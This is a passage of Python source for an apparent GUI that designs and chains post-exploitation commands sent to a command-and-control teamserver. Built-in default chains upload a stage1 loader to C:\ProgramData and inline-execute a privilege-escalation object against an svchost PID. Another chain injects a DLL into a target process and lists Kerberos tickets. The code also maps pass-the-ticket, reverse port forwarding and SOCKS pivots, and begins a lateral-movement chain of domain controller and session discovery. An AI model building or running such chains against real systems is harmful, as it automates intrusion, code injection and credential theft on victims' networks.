    elif build == "pivot_pipe":
        vals["_pipe"] = info.get("Param", "")
    elif build == "pivot_agent":
        vals["_agent_id"] = info.get("Param", "")
    elif build == "transfer_id":
        vals["_file_id"] = info.get("FileID", "")
    elif build == "rportfwd_add":
        params = info.get("Params", ";;;")
        parts = params.split(";")
        vals["_lcl_addr"] = parts[0] if len(parts) > 0 else ""
        vals["_lcl_port"] = parts[1] if len(parts) > 1 else ""
        vals["_fwd_addr"] = parts[2] if len(parts) > 2 else ""
        vals["_fwd_port"] = parts[3] if len(parts) > 3 else ""
    elif build == "rportfwd_remove":
        vals["_socket_id"] = info.get("Params", "")
    elif build == "socks_port":
        vals["_port"] = info.get("Params", "")
    elif build == "kerberos_klist_luid":
        vals["_luid"] = info.get("Argument2", "")
    elif build == "kerberos_purge":
        vals["_luid"] = info.get("Argument", "")
    elif build == "kerberos_ptt":
        ticket = info.get("Ticket", "")
        m = re.search(r"<B64BIN:(.+?)>", ticket)
        vals["_ticket_file"] = m.group(1) if m else ticket
        vals["_luid"] = info.get("Luid", "0")
    elif build == "direct":
        for f in cmd_def["fields"]:
            if not f["key"].startswith("_"):
                vals[f["key"]] = info.get(f["key"], f.get("default", ""))

    return vals

class SettingsDialog(tk.Toplevel):
    def __init__(self, parent, current_config):
        super().__init__(parent)
        self.title("Project Settings")
        self.geometry("400x350")
        self.configure(bg="#2b2b2b")
        self.result = None
        
        style = ttk.Style()
        style.theme_use('clam')
        
        self.entries = {}
        fields = [
            ("host", "Teamserver IP:"),
            ("port", "Teamserver Port:"),
            ("user", "Username:"),
            ("pass", "Password:"),
            ("payload_dir", "Payload Directory:")
        ]
        
        for key, label in fields:
            ttk.Label(self, text=label).pack(pady=(10, 2))
            e = ttk.Entry(self, width=40)
            e.pack()
            e.insert(0, current_config.get(key, ""))
            self.entries[key] = e
            
        btn_frame = tk.Frame(self, bg="#2b2b2b")
        btn_frame.pack(pady=20)
        ttk.Button(btn_frame, text="Save", command=self.save).pack(side=tk.LEFT, padx=10)
        ttk.Button(btn_frame, text="Cancel", command=self.destroy).pack(side=tk.LEFT)
        
    def save(self):
        self.result = {k: e.get() for k, e in self.entries.items()}
        self.destroy()

class StepEditorDialog(tk.Toplevel):
    def __init__(self, parent, step_data=None):
        super().__init__(parent)
        self.title("Step Editor")
        self.geometry("650x800")
        self.configure(bg="#2b2b2b")
        self.step_data = step_data
        self.result = None
        self.regex_entries = []
        self.field_widgets = {}
        self.current_cmd_index = None

        style = ttk.Style()
        style.theme_use('clam')
        style.configure("TLabel", background="#2b2b2b", foreground="#ffffff")
        style.configure("TButton", background="#4a4a4a", foreground="#ffffff")

        main_canvas = tk.Canvas(self, bg="#2b2b2b", highlightthickness=0)
        scrollbar = ttk.Scrollbar(self, orient=tk.VERTICAL, command=main_canvas.yview)
        self.scroll_frame = tk.Frame(main_canvas, bg="#2b2b2b")

        self.scroll_frame.bind("<Configure>", lambda e: main_canvas.configure(scrollregion=main_canvas.bbox("all")))
        main_canvas.create_window((0, 0), window=self.scroll_frame, anchor="nw", width=630)
        main_canvas.configure(yscrollcommand=scrollbar.set)

        main_canvas.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

        def _on_mousewheel(e):
            if main_canvas.winfo_exists():
                main_canvas.yview_scroll(int(-1*(e.delta/120)), "units")
        def _on_scroll_up(e):
            if main_canvas.winfo_exists():
                main_canvas.yview_scroll(-1, "units")
        def _on_scroll_down(e):
            if main_canvas.winfo_exists():
                main_canvas.yview_scroll(1, "units")
        self.bind("<MouseWheel>", _on_mousewheel)
        self.bind("<Button-4>", _on_scroll_up)
        self.bind("<Button-5>", _on_scroll_down)
        main_canvas.bind("<MouseWheel>", _on_mousewheel)
        main_canvas.bind("<Button-4>", _on_scroll_up)
        main_canvas.bind("<Button-5>", _on_scroll_down)
        self.scroll_frame.bind("<MouseWheel>", _on_mousewheel)
        self.scroll_frame.bind("<Button-4>", _on_scroll_up)
        self.scroll_frame.bind("<Button-5>", _on_scroll_down)

        sf = self.scroll_frame

        ttk.Label(sf, text="Description (what shows on the node):").pack(pady=(10,0), padx=10, anchor=tk.W)
        self.desc_entry = ttk.Entry(sf, width=60)
        self.desc_entry.pack(pady=5, padx=10, fill=tk.X)
        if step_data:
            self.desc_entry.insert(0, step_data.get("desc", ""))

        ttk.Label(sf, text="Node Style (Width, Height, Font Size):").pack(pady=(10,0), padx=10, anchor=tk.W)
        vis_frame = tk.Frame(sf, bg="#2b2b2b")
        vis_frame.pack(fill=tk.X, pady=2, padx=10)

        self.w_var = tk.StringVar(value="250")
        self.h_var = tk.StringVar(value="70")
        self.f_var = tk.StringVar(value="10")

        if step_data:
            self.w_var.set(str(step_data.get("width", 250)))
            self.h_var.set(str(step_data.get("height", 70)))
            self.f_var.set(str(step_data.get("font_size", 10)))

        ttk.Label(vis_frame, text="W:").pack(side=tk.LEFT)
        ttk.Entry(vis_frame, width=5, textvariable=self.w_var).pack(side=tk.LEFT, padx=(2,10))
        ttk.Label(vis_frame, text="H:").pack(side=tk.LEFT)
        ttk.Entry(vis_frame, width=5, textvariable=self.h_var).pack(side=tk.LEFT, padx=(2,10))
        ttk.Label(vis_frame, text="Font:").pack(side=tk.LEFT)
        ttk.Entry(vis_frame, width=5, textvariable=self.f_var).pack(side=tk.LEFT, padx=(2,10))

        sep1 = ttk.Separator(sf, orient=tk.HORIZONTAL)
        sep1.pack(fill=tk.X, pady=10, padx=10)

        ttk.Label(sf, text="Command Type:", font=("Consolas", 11, "bold")).pack(pady=(5,0), padx=10, anchor=tk.W)
        cmd_names = [cmd["name"] for cmd in COMMAND_LIBRARY]
        self.cmd_combo = ttk.Combobox(sf, values=cmd_names, state="readonly", width=55)
        self.cmd_combo.pack(pady=5, padx=10, fill=tk.X)
        self.cmd_combo.bind("<<ComboboxSelected>>", self.on_cmd_select)

        if step_data:
            idx = step_data.get("cmd_index")
            if idx is None:
                idx = find_command_index(step_data.get("info", {}))
            if idx is not None and 0 <= idx < len(COMMAND_LIBRARY):
                self.current_cmd_index = idx
                self.cmd_combo.current(idx)

        self.fields_frame = tk.Frame(sf, bg="#2b2b2b")
        self.fields_frame.pack(fill=tk.X, pady=10, padx=10)

        sep2 = ttk.Separator(sf, orient=tk.HORIZONTAL)
        sep2.pack(fill=tk.X, pady=5, padx=10)

        ttk.Label(sf, text="Dependency Generation (regex → variable):").pack(pady=(5,0), padx=10, anchor=tk.W)
        self.regex_frame = tk.Frame(sf, bg="#2b2b2b")
        self.regex_frame.pack(fill=tk.X, pady=5, padx=10)

        ttk.Button(sf, text="+ Add Regex Rule", command=self.add_regex_row).pack(padx=10, anchor=tk.W)

        if step_data:
            if "regex" in step_data and "var_name" in step_data:
                self.add_regex_row(step_data["regex"], step_data["var_name"])
            elif "regexes" in step_data:
                for r in step_data["regexes"]:
                    self.add_regex_row(r["regex"], r["var_name"])

        sep3 = ttk.Separator(sf, orient=tk.HORIZONTAL)
        sep3.pack(fill=tk.X, pady=10, padx=10)

        btn_frame = tk.Frame(sf, bg="#2b2b2b")
        btn_frame.pack(pady=10, padx=10)
        ttk.Button(btn_frame, text="💾 Save Step", command=self.save).pack(side=tk.LEFT, padx=10)
        ttk.Button(btn_frame, text="Cancel", command=self.destroy).pack(side=tk.LEFT)

        if step_data and self.current_cmd_index is not None:
            self.on_cmd_select(None)
            cmd_def = COMMAND_LIBRARY[self.current_cmd_index]
            user_vals = step_data.get("user_vals")
            if user_vals is None:
                user_vals = extract_user_vals(cmd_def, step_data.get("info", {}))
            self.prefill_fields(cmd_def, user_vals)

    def prefill_fields(self, cmd_def, user_vals):
        for f in cmd_def["fields"]:
            key = f["key"]
            widget = self.field_widgets.get(key)
            if widget is None:
                continue
            val = user_vals.get(key, f.get("default", ""))
            if isinstance(widget, ttk.Combobox):
                widget.set(val)
            else:
                widget.delete(0, tk.END)
                widget.insert(0, val)
                widget.config(foreground="#1e1e1e")

    def add_regex_row(self, reg_val="", var_val=""):
        row = tk.Frame(self.regex_frame, bg="#2b2b2b")
        row.pack(fill=tk.X, pady=2)
        ttk.Label(row, text="Regex:").pack(side=tk.LEFT, padx=2)
        reg_e = ttk.Entry(row, width=25)
        reg_e.pack(side=tk.LEFT, padx=2)
        reg_e.insert(0, reg_val)

        ttk.Label(row, text="→ Var:").pack(side=tk.LEFT, padx=2)
        var_e = ttk.Entry(row, width=15)
        var_e.pack(side=tk.LEFT, padx=2)
        var_e.insert(0, var_val)

        def remove():
            row.destroy()
            self.regex_entries.remove((reg_e, var_e, row))

        ttk.Button(row, text="✕", width=3, command=remove).pack(side=tk.LEFT, padx=5)
        self.regex_entries.append((reg_e, var_e, row))

    def on_cmd_select(self, event):
        for widget in self.fields_frame.winfo_children():
            widget.destroy()
        self.field_widgets = {}

        sel_idx = self.cmd_combo.current()
        if sel_idx < 0:
            return
        self.current_cmd_index = sel_idx
        cmd_def = COMMAND_LIBRARY[sel_idx]

        if not cmd_def["fields"]:
            ttk.Label(self.fields_frame, text="(no parameters needed)", foreground="#6272a4").pack(pady=10)
            return

        for f in cmd_def["fields"]:
            row = tk.Frame(self.fields_frame, bg="#2b2b2b")
            row.pack(fill=tk.X, pady=3)

            ttk.Label(row, text=f["label"] + ":").pack(anchor=tk.W)

            if f["type"] == "dropdown":
                combo = ttk.Combobox(row, values=f.get("options", []), state="readonly", width=40)
                combo.pack(fill=tk.X, pady=1)
                default = f.get("default", "")
                if default and default in f.get("options", []):
                    combo.set(default)
                elif f.get("options"):
                    combo.current(0)
                self.field_widgets[f["key"]] = combo

            elif f["type"] == "file":
                file_frame = tk.Frame(row, bg="#2b2b2b")
                file_frame.pack(fill=tk.X, pady=1)
                entry = ttk.Entry(file_frame, width=45)
                entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
                if f.get("placeholder"):
                    entry.insert(0, f["placeholder"])
                    entry.config(foreground="#6272a4")
                    def on_focus_in(e, ent=entry, ph=f["placeholder"]):
                        if ent.get() == ph:
                            ent.delete(0, tk.END)
                            ent.config(foreground="#1e1e1e")
                    def on_focus_out(e, ent=entry, ph=f["placeholder"]):
                        if not ent.get():
                            ent.insert(0, ph)
                            ent.config(foreground="#6272a4")
                    entry.bind("<FocusIn>", on_focus_in)
                    entry.bind("<FocusOut>", on_focus_out)
                def browse(ent=entry):
                    path = filedialog.askopenfilename(parent=self, title=f.get("label", "Select File"))
                    if path:
                        ent.delete(0, tk.END)
                        ent.insert(0, path)
                        ent.config(foreground="#1e1e1e")
                ttk.Button(file_frame, text="📂", width=3, command=browse).pack(side=tk.LEFT, padx=3)
                self.field_widgets[f["key"]] = entry

            else:
                entry = ttk.Entry(row, width=50)
                entry.pack(fill=tk.X, pady=1)
                default = f.get("default", "")
                if default:
                    entry.insert(0, default)
                elif f.get("placeholder"):
                    entry.insert(0, f["placeholder"])
                    entry.config(foreground="#6272a4")
                    def on_focus_in(e, ent=entry, ph=f["placeholder"]):
                        if ent.get() == ph:
                            ent.delete(0, tk.END)
                            ent.config(foreground="#1e1e1e")
                    def on_focus_out(e, ent=entry, ph=f["placeholder"]):
                        if not ent.get():
                            ent.insert(0, ph)
                            ent.config(foreground="#6272a4")
                    entry.bind("<FocusIn>", on_focus_in)
                    entry.bind("<FocusOut>", on_focus_out)
                self.field_widgets[f["key"]] = entry

    def get_user_vals(self):
        if self.current_cmd_index is None:
            return {}
        cmd_def = COMMAND_LIBRARY[self.current_cmd_index]
        vals = {}
        for f in cmd_def["fields"]:
            widget = self.field_widgets.get(f["key"])
            if widget is None:
                vals[f["key"]] = f.get("default", "")
                continue
            val = widget.get() if isinstance(widget, (ttk.Entry, tk.Entry, ttk.Combobox)) else ""
            if val == f.get("placeholder", ""):
                val = f.get("default", "")
            vals[f["key"]] = val
        return vals

    def save(self):
        if self.current_cmd_index is None:
            messagebox.showerror("Error", "Pick a command type first.")
            return

        cmd_def = COMMAND_LIBRARY[self.current_cmd_index]
        user_vals = self.get_user_vals()
        info = build_info_dict(cmd_def, user_vals)

        desc = self.desc_entry.get().strip()
        if not desc:
            desc = cmd_def["name"]
            key_vals = [v for k, v in user_vals.items() if v and v != "go" and v != "false" and v != "default"]
            if key_vals:
                desc += " " + " ".join(key_vals[:2])

        self.result = {
            "type": "custom",
            "desc": desc,
            "info": info,
            "cmd_index": self.current_cmd_index,
            "user_vals": user_vals,
            "regexes": []
        }

        try:
            self.result["width"] = int(self.w_var.get())
            self.result["height"] = int(self.h_var.get())
            self.result["font_size"] = int(self.f_var.get())
        except:
            self.result["width"] = 250
            self.result["height"] = 70
            self.result["font_size"] = 10

        for reg_e, var_e, _ in self.regex_entries:
            r = reg_e.get()
            v = var_e.get()
            if r and v:
                self.result["regexes"].append({"regex": r, "var_name": v})

        self.destroy()


class ProjectWorkspace:
    def __init__(self, parent_frame, app, title):
        self.parent = parent_frame
        self.app = app
        self.title = title
        self.chains = {"low_priv": [], "system": [], "dependencies": []}
        self.drag_data = {"item": None, "x": 0, "y": 0}

        self.config = {
            "host": "127.0.0.1",
            "port": "40056",
            "user": "operator",
            "pass": "changeme",
            "payload_dir": "./modules"
        }

        self.setup_ui()

    def setup_ui(self):
        menu_frame = tk.Frame(self.parent, bg="#333333")
        menu_frame.pack(fill=tk.X, side=tk.TOP)

        menu_style = {"bg": "#333333", "fg": "#f8f8f2", "activebackground": "#6272a4",
                       "activeforeground": "#f8f8f2", "relief": tk.FLAT, "font": ("Consolas", 10, "bold"),
                       "padx": 8, "pady": 2}
        dropdown_style = {"bg": "#333333", "fg": "#f8f8f2", "activebackground": "#6272a4",
                          "activeforeground": "#f8f8f2", "font": ("Consolas", 10), "tearoff": 0}

        file_mb = tk.Menubutton(menu_frame, text=" File ", **menu_style)
        file_mb.pack(side=tk.LEFT)
        file_menu = tk.Menu(file_mb, **dropdown_style)
        file_menu.add_command(label="  Open Source (.py)...", command=self.open_file)
        file_menu.add_command(label="  Load JSON Project...", command=self.load_project_json)
        file_menu.add_separator()
        file_menu.add_command(label="  Save JSON Project...", command=self.save_project_json)
        file_menu.add_command(label="  Compile As (.py)...", command=self.compile_code)
        file_menu.add_separator()
        file_menu.add_command(label="  Settings...", command=self.open_settings)
        file_mb["menu"] = file_menu

        edit_mb = tk.Menubutton(menu_frame, text=" Edit ", **menu_style)
        edit_mb.pack(side=tk.LEFT)
        edit_menu = tk.Menu(edit_mb, **dropdown_style)
        edit_menu.add_command(label="  Copy Low Priv Chain", command=lambda: self.copy_chain("low_priv"))
        edit_menu.add_command(label="  Copy SYSTEM Chain", command=lambda: self.copy_chain("system"))
        edit_menu.add_separator()
        edit_menu.add_command(label="  Paste Chain to Low Priv", command=lambda: self.paste_chain("low_priv", 100, 100))
        edit_menu.add_command(label="  Paste Chain to SYSTEM", command=lambda: self.paste_chain("system", 500, 100))
        edit_menu.add_separator()
        edit_menu.add_command(label="  Reset to Defaults", command=self.load_defaults)
        edit_mb["menu"] = edit_menu

        chain_mb = tk.Menubutton(menu_frame, text=" Chain ", **menu_style)
        chain_mb.pack(side=tk.LEFT)
        chain_menu = tk.Menu(chain_mb, **dropdown_style)
        chain_menu.add_command(label="  + Add Low Priv Step", command=lambda: self.add_step("low_priv"))
        chain_menu.add_command(label="  + Add SYSTEM Step", command=lambda: self.add_step("system"))
        chain_mb["menu"] = chain_menu
        
        # Bottom preview
        bottom_frame = ttk.Frame(self.parent, height=120)
        bottom_frame.pack(fill=tk.X, side=tk.BOTTOM, padx=5, pady=5)
        bottom_frame.pack_propagate(False)
        self.json_preview = tk.Text(bottom_frame, bg="#1e1e1e", fg="#8be9fd", font=("Consolas", 9))
        self.json_preview.pack(fill=tk.BOTH, expand=True)

        # Canvas
        self.canvas = tk.Canvas(self.parent, bg="#282a36", highlightthickness=0)
        self.canvas.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.canvas.bind("<ButtonPress-1>", self.on_drag_start)
        self.canvas.bind("<B1-Motion>", self.on_drag_motion)
        self.canvas.bind("<ButtonRelease-1>", self.on_drag_release)
        self.canvas.bind("<Button-3>", self.show_context_menu)

    def open_settings(self):
        dialog = SettingsDialog(self.app.root, self.config)
        self.app.root.wait_window(dialog)
        if dialog.result:
            self.config = dialog.result

    def save_project_json(self):
        filepath = filedialog.asksaveasfilename(defaultextension=".json", filetypes=[("JSON Files", "*.json")])
        if filepath:
            with open(filepath, 'w') as f:
                json.dump(self.chains, f, indent=4)
            messagebox.showinfo("Success", "Project saved successfully!")
            
    def load_project_json(self):
        filepath = filedialog.askopenfilename(filetypes=[("JSON Files", "*.json")])
        if filepath:
            try:
                with open(filepath, 'r') as f:
                    self.chains = json.load(f)
                self.rebuild_deps()
                self.draw_graph()
                messagebox.showinfo("Success", "Project loaded successfully!")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to load project: {e}")

    def generate_id(self, prefix):
        return f"{prefix}_{''.join(random.choices(string.ascii_lowercase + string.digits, k=6))}"

    def rebuild_deps(self):
        self.chains["dependencies"] = []
        for c in ["low_priv", "system"]:
            for step in self.chains[c]:
                if "regex" in step and "var_name" in step:
                    if "regexes" not in step: step["regexes"] = []
                    step["regexes"].append({"regex": step["regex"], "var_name": step["var_name"]})
                    del step["regex"]
                    del step["var_name"]
                    
                if "regexes" in step:
                    for r in step["regexes"]:
                        self.chains["dependencies"].append({
                            "source_id": step["id"],
                            "source_step": step["desc"],
                            "regex": r["regex"],
                            "var_name": r["var_name"]
                        })

    def draw_graph(self):
        self.canvas.delete("all")
        
        for dep in self.chains["dependencies"]:
            var_name = dep["var_name"]
            src_step = self.find_step_by_id(dep["source_id"])
            if not src_step: continue
            
            for c in ["low_priv", "system"]:
                for consumer in self.chains[c]:
                    info_str = json.dumps(consumer.get("info", {}))
                    if f"{{{var_name}}}" in info_str:
                        self.draw_dependency_edge(src_step, consumer, var_name)

        for c in ["low_priv", "system"]:
            chain = self.chains[c]
            for i in range(len(chain) - 1):
                self.draw_sequential_edge(chain[i], chain[i+1])

        for step in self.chains["low_priv"]:
            self.draw_node(step, "#ffb86c", "low_priv")
        for step in self.chains["system"]:
            self.draw_node(step, "#ff5555", "system")

    def draw_node(self, step, color, chain_name):
        x, y = step.get("x", 100), step.get("y", 100)
        w = step.get("width", 250)
        h = step.get("height", 70)
        f_size = step.get("font_size", 10)
        
        tags = ("node", step["id"], chain_name)
        
        rect = self.canvas.create_rectangle(x, y, x+w, y+h, fill="#44475a", outline=color, width=2, tags=tags)
        
        chain_lbl = "Chain A" if chain_name == "low_priv" else "Chain B"
        self.canvas.create_text(x+5, y+5, text=chain_lbl, fill=color, font=("Consolas", 8, "bold"), anchor="nw", tags=tags)
        
        desc = step.get("desc", "Step")
        self.canvas.create_text(x+w/2, y+h/2, text=desc, fill="#f8f8f2", font=("Consolas", f_size), justify=tk.CENTER, width=w-10, tags=tags)
        
        if "regexes" in step and step["regexes"]:
            vars_txt = ", ".join([r["var_name"] for r in step["regexes"]])
            self.canvas.create_text(x+w-5, y+h-5, text=f"Out: {vars_txt}", fill="#50fa7b", font=("Consolas", 8), anchor="se", tags=tags)

    def draw_sequential_edge(self, n1, n2):
        w1 = n1.get("width", 250)
        w2 = n2.get("width", 250)
        x1, y1 = n1.get("x", 0) + w1/2, n1.get("y", 0) + n1.get("height", 70)
        x2, y2 = n2.get("x", 0) + w2/2, n2.get("y", 0)
        self.canvas.create_line(x1, y1, x2, y2, arrow=tk.LAST, fill="#6272a4", width=3, tags="edge")

    def draw_dependency_edge(self, n1, n2, var_name):
        w1 = n1.get("width", 250)
        h1 = n1.get("height", 70)
        h2 = n2.get("height", 70)
        x1, y1 = n1.get("x", 0) + w1, n1.get("y", 0) + h1/2
        x2, y2 = n2.get("x", 0), n2.get("y", 0) + h2/2
        
        self.canvas.create_line(x1, y1, x1+50, y1, x2-50, y2, x2, y2, smooth=True, fill="#8be9fd", width=2, dash=(4, 4), arrow=tk.LAST, tags="edge")
        mx, my = (x1+x2)/2, (y1+y2)/2
        self.canvas.create_text(mx, my-10, text=f"{{{var_name}}}", fill="#8be9fd", font=("Consolas", 8), tags="edge")

    def find_step_by_id(self, step_id):
        for c in ["low_priv", "system"]:
            for s in self.chains[c]:
                if s["id"] == step_id: return s
        return None

    def find_chain_by_id(self, step_id):
        for c in ["low_priv", "system"]:
            for s in self.chains[c]:
                if s["id"] == step_id: return c
        return None

    def get_node_at(self, x, y):
        items = self.canvas.find_withtag("current")
        if not items:
            items = self.canvas.find_overlapping(x, y, x, y)
        for item in items:
            tags = self.canvas.gettags(item)
            if "node" in tags:
                for t in tags:
                    if t.startswith("l_") or t.startswith("s_"):
                        return t
        return None

    def on_drag_start(self, event):
        node_id = self.get_node_at(event.x, event.y)
        if node_id:
            step = self.find_step_by_id(node_id)
            if step:
                self.drag_data["item"] = step
                self.drag_data["x"] = event.x - step.get("x", 0)
                self.drag_data["y"] = event.y - step.get("y", 0)
                
                self.json_preview.delete(1.0, tk.END)
                self.json_preview.insert(tk.END, json.dumps(step.get("info", {}), indent=2))

    def on_drag_motion(self, event):
        if self.drag_data["item"]:
            step = self.drag_data["item"]
            step["x"] = event.x - self.drag_data["x"]
            step["y"] = event.y - self.drag_data["y"]
            self.draw_graph()

    def on_drag_release(self, event):
        self.drag_data["item"] = None

    def show_context_menu(self, event):
        node_id = self.get_node_at(event.x, event.y)
        menu = tk.Menu(self.app.root, tearoff=0)
        
        if node_id:
            step = self.find_step_by_id(node_id)
            if step:
                self.json_preview.delete(1.0, tk.END)
                self.json_preview.insert(tk.END, json.dumps(step.get("info", {}), indent=2))
                
                menu.add_command(label="Edit Step", command=lambda: self.edit_step(node_id))
                menu.add_command(label="Copy Step", command=lambda: self.copy_step(node_id))
                menu.add_command(label="Cut Step", command=lambda: self.cut_step(node_id))
                menu.add_command(label="Remove Step", command=lambda: self.remove_step(node_id))
        else:
            menu.add_command(label="Edit Step", state="disabled")
            menu.add_command(label="Copy Step", state="disabled")
            menu.add_command(label="Cut Step", state="disabled")
            menu.add_command(label="Remove Step", state="disabled")
            
        if self.app.clipboard:
            menu.add_command(label="Paste into Low Priv", command=lambda: self.paste_step("low_priv", event.x, event.y))
            menu.add_command(label="Paste into SYSTEM", command=lambda: self.paste_step("system", event.x, event.y))
        else:
            menu.add_command(label="Paste into Low Priv", state="disabled")
            menu.add_command(label="Paste into SYSTEM", state="disabled")
            
        menu.add_separator()
        menu.add_command(label="Copy Entire Low Priv Chain", command=lambda: self.copy_chain("low_priv"))
        menu.add_command(label="Copy Entire SYSTEM Chain", command=lambda: self.copy_chain("system"))
        
        if hasattr(self.app, 'chain_clipboard') and self.app.chain_clipboard:
            menu.add_command(label="Paste Chain to Low Priv", command=lambda: self.paste_chain("low_priv", event.x, event.y))
            menu.add_command(label="Paste Chain to SYSTEM", command=lambda: self.paste_chain("system", event.x, event.y))

        menu.add_separator()
        menu.add_command(label="+ Add Low Priv Step", command=lambda: self.add_step("low_priv"))
        menu.add_command(label="+ Add SYSTEM Step", command=lambda: self.add_step("system"))

        menu.tk_popup(event.x_root, event.y_root)

    def add_step(self, chain_name):
        dialog = StepEditorDialog(self.app.root)
        self.app.root.wait_window(dialog)
        if dialog.result:
            dialog.result["id"] = self.generate_id("l" if chain_name == "low_priv" else "s")
            if self.chains[chain_name]:
                last = self.chains[chain_name][-1]
                dialog.result["x"] = last.get("x", 100)
                dialog.result["y"] = last.get("y", 100) + 150
            else:
                dialog.result["x"] = 100 if chain_name == "low_priv" else 500
                dialog.result["y"] = 100
                
            self.chains[chain_name].append(dialog.result)
            self.rebuild_deps()
            self.draw_graph()

    def edit_step(self, step_id):
        step = self.find_step_by_id(step_id)
        if not step: return
        dialog = StepEditorDialog(self.app.root, step)
        self.app.root.wait_window(dialog)
        if dialog.result:
            dialog.result["id"] = step["id"]
            dialog.result["x"] = step.get("x", 100)
            dialog.result["y"] = step.get("y", 100)
            
            chain_name = self.find_chain_by_id(step_id)
            idx = self.chains[chain_name].index(step)
            self.chains[chain_name][idx] = dialog.result
            self.rebuild_deps()
            self.draw_graph()
            self.json_preview.delete(1.0, tk.END)
            self.json_preview.insert(tk.END, json.dumps(dialog.result.get("info", {}), indent=2))

    def copy_step(self, step_id):
        step = self.find_step_by_id(step_id)
        if step:
            self.app.clipboard = copy.deepcopy(step)

    def cut_step(self, step_id):
        step = self.find_step_by_id(step_id)
        chain_name = self.find_chain_by_id(step_id)
        if step:
            self.app.clipboard = copy.deepcopy(step)
            self.chains[chain_name].remove(step)
            self.rebuild_deps()
            self.draw_graph()

    def remove_step(self, step_id):
        step = self.find_step_by_id(step_id)
        chain_name = self.find_chain_by_id(step_id)
        if step:
            if "regexes" in step and step["regexes"]:
                if not messagebox.askyesno("Warning", "This step generates a dependency for later steps. Remove anyway?"):
                    return
            self.chains[chain_name].remove(step)
            self.rebuild_deps()
            self.draw_graph()

    def paste_step(self, chain_name, x, y):
        if not self.app.clipboard: return
        new_step = copy.deepcopy(self.app.clipboard)
        new_step["id"] = self.generate_id("l" if chain_name == "low_priv" else "s")
        new_step["x"] = x
        new_step["y"] = y
        self.chains[chain_name].append(new_step)
        self.rebuild_deps()
        self.draw_graph()

    def copy_chain(self, chain_name):
        self.app.chain_clipboard = copy.deepcopy(self.chains[chain_name])
        messagebox.showinfo("Copied", f"Copied {len(self.app.chain_clipboard)} steps from {chain_name}.")

    def paste_chain(self, chain_name, x, y):
        if not hasattr(self.app, 'chain_clipboard') or not self.app.chain_clipboard: return
        
        if self.app.chain_clipboard:
            offset_x = x - self.app.chain_clipboard[0].get("x", 0)
            offset_y = y - self.app.chain_clipboard[0].get("y", 0)
        else:
            offset_x, offset_y = 0, 0
            
        for step in self.app.chain_clipboard:
            new_step = copy.deepcopy(step)
            new_step["id"] = self.generate_id("l" if chain_name == "low_priv" else "s")
            new_step["x"] = new_step.get("x", 0) + offset_x
            new_step["y"] = new_step.get("y", 0) + offset_y
            self.chains[chain_name].append(new_step)
            
        self.rebuild_deps()
        self.draw_graph()

    def load_defaults(self):
        p_dir = self.config["payload_dir"]
        self.chains["low_priv"] = [
            {"id": "l_1", "type": "custom", "desc": "📁 upload stage1_loader.bin → C:\\ProgramData", "cmd_index": 0,
             "user_vals": {"_local": f"{p_dir}/stage1_loader.bin", "_remote": "C:\\ProgramData\\stage1_loader.bin"},
             "info": {"CommandID": "15", "SubCommand": "upload", "Arguments": f"<B64FILE:{p_dir}/stage1_loader.bin:C:\\ProgramData\\stage1_loader.bin>"},
             "x": 50, "y": 60, "width": 270, "height": 75, "font_size": 10},
            {"id": "l_2", "type": "custom", "desc": "⚙️ Process Search (svchost.exe)", "cmd_index": 22,
             "user_vals": {"_search": "svchost.exe"},
             "info": {"CommandID": "4112", "ProcCommand": "3", "Args": "svchost.exe"},
             "regexes": [{"regex": r"svchost\.exe\s+(\d+)", "var_name": "svc_pid"}],
             "x": 50, "y": 210, "width": 270, "height": 75, "font_size": 10},
            {"id": "l_3", "type": "custom", "desc": "💉 Inline-Execute privesc_audit.o (PID: {svc_pid})", "cmd_index": 10,
             "user_vals": {"_file": f"{p_dir}/privesc_audit.o", "FunctionName": "go", "Arguments": "{svc_pid}", "Flags": "threaded", "HasCallback": "true"},
             "info": {"CommandID": "20", "FunctionName": "go", "Binary": f"<B64BIN:{p_dir}/privesc_audit.o>", "Arguments": "{svc_pid}", "HasCallback": "true", "Flags": "threaded"},
             "x": 50, "y": 360, "width": 270, "height": 75, "font_size": 10}
        ]
        self.chains["system"] = [
            {"id": "s_1", "type": "custom", "desc": "💉 Inline-Execute proc_enum.o (BOF)", "cmd_index": 10,
             "user_vals": {"_file": f"{p_dir}/proc_enum.o", "FunctionName": "go", "Arguments": "", "Flags": "default", "HasCallback": "true"},
             "info": {"CommandID": "20", "FunctionName": "go", "Binary": f"<B64BIN:{p_dir}/proc_enum.o>", "Arguments": "", "HasCallback": "true", "Flags": "default"},
             "regexes": [{"regex": r"TARGET_PID:(\d+)", "var_name": "target_pid"}],
             "x": 430, "y": 60, "width": 270, "height": 75, "font_size": 10},
            {"id": "s_2", "type": "custom", "desc": "💉 DLL Inject telemetry_hook.dll → {target_pid}", "cmd_index": 11,
             "user_vals": {"PID": "{target_pid}", "_file": f"{p_dir}/telemetry_hook.dll", "Arguments": ""},
             "info": {"CommandID": "22", "PID": "{target_pid}", "Binary": f"<B64BIN:{p_dir}/telemetry_hook.dll>", "Arguments": ""},
             "x": 430, "y": 210, "width": 270, "height": 75, "font_size": 10},
            {"id": "s_3", "type": "custom", "desc": "🔐 Kerberos KList (/all) & Telemetry Collection", "cmd_index": 64,
             "user_vals": {},
             "info": {"CommandID": "2550", "Command": "klist", "Argument1": "/all"},
             "x": 430, "y": 360, "width": 270, "height": 75, "font_size": 10}
        ]
        self.rebuild_deps()
        self.draw_graph()
        if self.chains["system"]:
            self.json_preview.delete(1.0, tk.END)
            self.json_preview.insert(tk.END, json.dumps(self.chains["system"][1].get("info", {}), indent=2))

    def load_lateral_example(self):
        p_dir = self.config["payload_dir"]
        self.chains["low_priv"] = [
            {"id": "l_10", "type": "custom", "desc": "🌐 Net Domain & DC Discovery", "cmd_index": 34,
             "user_vals": {"Param": "CORP.LOCAL"},
             "info": {"CommandID": "2100", "NetCommand": "5", "Param": "CORP.LOCAL"},
             "regexes": [{"regex": r"DC:\s*([A-Za-z0-9\-\.]+)", "var_name": "dc_host"}],
             "x": 50, "y": 60, "width": 270, "height": 75, "font_size": 10},
            {"id": "l_11", "type": "custom", "desc": "🌐 Net Sessions on {dc_host}", "cmd_index": 32,
             "user_vals": {"Param": "{dc_host}"},
             "info": {"CommandID": "2100", "NetCommand": "3", "Param": "{dc_host}"},
             "x": 50, "y": 210, "width": 270, "height": 75, "font_size": 10},
